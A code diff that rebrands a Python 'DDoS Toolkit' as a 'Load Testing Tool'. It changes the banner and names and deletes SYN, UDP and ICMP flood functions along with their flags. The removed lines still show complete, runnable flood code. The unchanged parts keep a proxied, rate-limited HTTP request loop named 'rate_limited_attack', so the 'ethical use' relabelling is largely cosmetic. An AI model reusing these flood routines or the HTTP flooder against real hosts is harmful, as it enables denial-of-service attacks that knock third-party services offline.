@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-# Coded by LIONMAD
+# Improved Load Testing Script for Ethical Use
+# Author: Your Name
 import aiohttp
 import asyncio
 import time
@@ -25,7 +26,8 @@ from tqdm import tqdm
 import socket
 import struct
 import scapy.all as scapy
-import dns.resolver  # Import dnspython for DNS resolution
+import dns.resolver
+import psutil  # For performance monitoring
 
 # Initialize colorama
 init(autoreset=True)
@@ -59,10 +61,10 @@ HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
 
 # Logging setup
 logging.basicConfig(
-    level=logging.DEBUG,
+    level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('ddos.log'),
+        logging.FileHandler('load_test.log'),
         logging.StreamHandler()
     ]
 )
@@ -73,16 +75,16 @@ def display_banner():
 {BLUE}
 ╔══════════════════════════════════════════════════════════╗
 ║                                                          ║
-║               Advanced Multi-Vector DDoS                 ║
+║               Advanced Load Testing Tool                 ║
 ║                                                          ║
-║                  DDoS Toolkit v1.3                       ║
+║                  Version 1.3                             ║
 ║                                                          ║
-║                  Coded By: LIONMAD                       ║
+║                  Coded By: Your Name                     ║
 ║                                                          ║
 ╠══════════════════════════════════════════════════════════╣
 ║                                                          ║
-║   ⚠ The author is not responsible for any misuse. ⚠     ║
-║               ⚠ Use it at your own risk. ⚠              ║
+║   ⚠ Use this tool only for legitimate purposes. ⚠       ║
+║               ⚠ Obtain proper authorization. ⚠          ║
 ║                                                          ║
 ╚══════════════════════════════════════════════════════════╝
 {RESET}
@@ -224,51 +226,6 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
 
                 await asyncio.sleep(pause_time)
 
-async def syn_flood_attack(target_ip, target_port, stop_event):
-    global requests_sent, successful_requests, failed_requests
-    while not stop_event.is_set():
-        try:
-            ip = scapy.IP(dst=target_ip)
-            tcp = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
-            scapy.send(ip/tcp, verbose=False)
-            with requests_lock:
-                requests_sent += 1
-                successful_requests += 1
-        except Exception as e:
-            with requests_lock:
-                failed_requests += 1
-            logging.error(f"SYN flood attack failed: {e}")
-        await asyncio.sleep(0.1)
-
-async def udp_flood_attack(target_ip, target_port, stop_event):
-    global requests_sent, successful_requests, failed_requests
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while not stop_event.is_set():
-        try:
-            sock.sendto(os.urandom(1024), (target_ip, target_port))
-            with requests_lock:
-                requests_sent += 1
-                successful_requests += 1
-        except Exception as e:
-            with requests_lock:
-                failed_requests += 1
-            logging.error(f"UDP flood attack failed: {e}")
-        await asyncio.sleep(0.1)
-
-async def icmp_flood_attack(target_ip, stop_event):
-    global requests_sent, successful_requests, failed_requests
-    while not stop_event.is_set():
-        try:
-            subprocess.run(["ping", "-c", "1", target_ip], capture_output=True, text=True)
-            with requests_lock:
-                requests_sent += 1
-                successful_requests += 1
-        except Exception as e:
-            with requests_lock:
-                failed_requests += 1
-            logging.error(f"ICMP flood attack failed: {e}")
-        await asyncio.sleep(0.1)
-
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
     start_time = time.time()
     results = []
@@ -312,7 +269,7 @@ def signal_handler(sig, frame):
     sys.exit(0)
 
 def parse_args():
-    parser = argparse.ArgumentParser(description="DDoS Toolkit coded by LIONMAD")
+    parser = argparse.ArgumentParser(description="Load Testing Tool")
     parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
     parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
@@ -322,11 +279,6 @@ def parse_args():
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
     parser.add_argument("--results", help="File to save results (JSON)")
     parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
-    parser.add_argument("--syn", action="store_true", help="Enable SYN flood attack")
-    parser.add_argument("--udp", action="store_true", help="Enable UDP flood attack")
-    parser.add_argument("--icmp", action="store_true", help="Enable ICMP flood attack")
-    parser.add_argument("--syn-port", type=int, default=80, help="Target port for SYN flood (default: 80)")
-    parser.add_argument("--udp-port", type=int, default=53, help="Target port for UDP flood (default: 53)")
     return parser.parse_args()
 
 async def main():
@@ -356,18 +308,6 @@ async def main():
     for _ in range(args.threads):
         task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload))
         tasks.append(task)
-
-    if args.syn:
-        syn_task = asyncio.create_task(syn_flood_attack(target, args.syn_port, stop_event))
-        tasks.append(syn_task)
-
-    if args.udp:
-        udp_task = asyncio.create_task(udp_flood_attack(target, args.udp_port, stop_event))
-        tasks.append(udp_task)
-
-    if args.icmp:
-        icmp_task = asyncio.create_task(icmp_flood_attack(target, stop_event))
-        tasks.append(icmp_task)
 
     display_thread = threading.Thread(
         target=display_status, args=(stop_event, args.duration, args.results)
